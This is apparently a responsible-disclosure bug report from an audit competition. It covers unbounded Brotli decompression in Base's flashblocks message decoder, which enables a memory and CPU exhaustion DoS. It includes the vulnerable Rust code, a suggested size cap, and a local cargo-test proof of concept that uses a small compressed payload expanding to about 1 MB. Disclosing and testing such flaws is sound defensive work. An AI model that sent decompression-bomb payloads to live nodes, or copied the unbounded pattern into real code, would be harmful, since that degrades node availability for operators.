# 75034 bc medium unbounded brotli decompression in flashblock message decoding leads to node memory cpu exhaustion dos&#x20;

**Submitted on Apr 26th 2026 at 20:20:38 UTC by @raidocent for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75034
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.24>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

The flashblocks decoder in `base/base` (`crates/common/flashblocks`) decompresses Brotli input with `read_to_end` and no limit on how large the output can grow. A small compressed message can expand to a huge buffer in memory before JSON is parsed. If that code path sees **untrusted** input and nothing else caps size first, it can be used for a **decompression-style DoS** (memory/CPU pressure on the process). No user funds are taken; it’s a **liveness / resource** issue.

## Vulnerability Details

**Where:** `Flashblock::try_parse_message` in `crates/common/flashblocks/src/block.rs` (internal helper used by `try_decode_message`).

**What’s wrong:** If the bytes aren’t treated as plain JSON starting with `{`, the code uses the Brotli crate and does `read_to_end` into a `Vec` with **no max decompressed length**. The `4096` in `Decompressor::new` is only the read buffer size, not an output cap.

Relevant snippet (from `819ea306db40792a50626243034a62e3ca015ba6`):

```rust
let mut decompressor = brotli::Decompressor::new(bytes.as_ref(), 4096);
let mut decompressed = Vec::new();
decompressor.read_to_end(&mut decompressed).map_err(FlashblockDecodeError::Decompress)?;
```

**Fix direction:** cap total decompressed bytes (e.g. `take(n)` on the reader) before `read_to_end`, and/or cap max wire length for the plain-JSON branch.

## Impact Details

**Impact I selected on the form:** *Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours.*

**What an exploit would do:** waste **RAM and CPU** on decode; could slow or crash **individual** nodes or services that parse these messages if they’re exposed to attacker-controlled payloads and don’t already limit size at the edge.

**What I’m not claiming:** chain split, stolen funds, bridge loss, or breaking L1 finality. I also can’t prove the **exact 30% / 24h** bar from a local test alone—that’s for you to judge against real deployment limits.

## References

* Code: <https://github.com/base/base/blob/819ea306db40792a50626243034a62e3ca015ba6/crates/common/flashblocks/src/block.rs>
* Program: <https://immunefi.com/audit-competition/audit-comp-base-azul/information/>
* Scope: <https://immunefi.com/audit-competition/audit-comp-base-azul/scope/>

***

## Proof of Concept

This is written for **triage and reproduction** (per [Step-by-step POCs for Audit Competitions](https://immunefisupport.zendesk.com/hc/en-us/articles/33260632501777-Step-by-step-POCs-for-Audit-Competitions)). The bug is **Rust** in `base/base` `crates/common/flashblocks`, not a smart contract, so the [Foundry / Solidity templates](https://github.com/immunefi-team/forge-poc-templates) do not apply.

**Rules:** no mainnet or public testnets; reproduce with **local** `cargo test` only (not a live-network DoS). **In-scope asset:** `github.com/base/base` (use the program’s required ref, e.g. `v0.8.0-rc.24`).

{% stepper %}
{% step %}

## The plain-JSON path only runs if `from_utf8` succeeds and the text starts with `{`

The plain-JSON path only runs if `from_utf8` succeeds **and** the text (after `trim_start`) starts with `{`. Otherwise the decoder takes the Brotli path and calls `read_to_end` into an unbounded `Vec` — no cap on decompressed size.
{% endstep %}

{% step %}

## A small on-the-wire Brotli blob can still expand to a very large decompressed string

A small on-the-wire Brotli blob can still expand to a very large decompressed string, using RAM/CPU before further parsing.
{% endstep %}
{% endstepper %}

**How to verify:** clone and check out the in-scope `base/base` ref. In `crates/common/flashblocks/src/block.rs`, add the new test and helpers below to the existing `#[cfg(test)] mod tests` (if that checkout **already** defines `encode_brotli` and `sample_payload` next to the other tests, add **only** `decompress_brotli_expands_without_size_cap` to avoid duplicate items). From the repo root, run:\
`cargo test -p base-common-flashblocks decompress_brotli_expands_without_size_cap -- --ignored --nocapture`

***

### Vulnerable code (production, `block.rs`)

In `impl Flashblock` (module has `use std::io::Read;` and `use bytes::Bytes;` at top).

```rust
fn try_parse_message(bytes: Bytes) -> Result<String, FlashblockDecodeError> {
    if let Ok(text) = std::str::from_utf8(&bytes)
        && text.trim_start().starts_with('{')
    {
        return Ok(text.to_owned());
    }

    let mut decompressor = brotli::Decompressor::new(bytes.as_ref(), 4096);
    let mut decompressed = Vec::new();
    decompressor
        .read_to_end(&mut decompressed)
        .map_err(FlashblockDecodeError::Decompress)?;

    let text = String::from_utf8(decompressed).map_err(FlashblockDecodeError::Utf8)?;
    Ok(text)
}
```

### Reproduction test (same `mod tests` as other `Flashblock` tests)

The test encodes a JSON with a 1M-character `pad` field with Brotli, then decodes with `try_decode_message` (which uses `try_parse_message`). The compressed `wire` stays small; decompressed data is large.

```rust
fn encode_brotli(payload: &FlashblocksPayloadV1) -> Bytes {
    let mut compressed = Vec::new();
    let data = serde_json::to_vec(payload).expect("serialize payload");
    {
        let mut writer = brotli::CompressorWriter::new(&mut compressed, 4096, 5, 22);
        writer.write_all(&data).expect("write compressed payload");
    }
    Bytes::from(compressed)
}

/// PoC: Brotli path uses `read_to_end` with no cap on decompressed size.
#[test]
#[ignore = "allocates a large buffer; not for default CI runs"]
fn decompress_brotli_expands_without_size_cap() {
    const PAD: usize = 1_000_000;
    let big = "x".repeat(PAD);
    let payload = sample_payload(
        json!({ "block_number": 0u64, "pad": big })
    );
    let wire = encode_brotli(&payload);
    assert!(
        wire.len() < PAD / 10,
        "wire should be much smaller than decompressed JSON (Brotli-compressed padding)"
    );
    let _decoded = Flashblock::try_decode_message(wire).expect("valid flashblock");
}

fn sample_payload(metadata: serde_json::Value) -> FlashblocksPayloadV1 {
    FlashblocksPayloadV1 {
        payload_id: PayloadId::default(),
        index: 7,
        base: Some(ExecutionPayloadBaseV1 {
            parent_beacon_block_root: B256::from([1u8; 32]),
            parent_hash: B256::from([2u8; 32]),
            fee_recipient: Address::ZERO,
            prev_randao: B256::from([3u8; 32]),
            block_number: 9,
            gas_limit: 1_000_000,
            timestamp: 1_700_000_000,
            extra_data: PrimitiveBytes::from(vec![0xAA, 0xBB]),
            base_fee_per_gas: U256::from(10u64),
        }),
        diff: ExecutionPayloadFlashblockDeltaV1 {
            state_root: B256::from([4u8; 32]),
            receipts_root: B256::from([5u8; 32]),
            logs_bloom: Bloom::default(),
            gas_used: 500_000,
            block_hash: B256::from([6u8; 32]),
            transactions: vec![PrimitiveBytes::from(vec![0x01, 0x02])],
            withdrawals: Vec::new(),
            withdrawals_root: B256::from([7u8; 32]),
            blob_gas_used: Some(44),
        },
        metadata,
    }
}
```
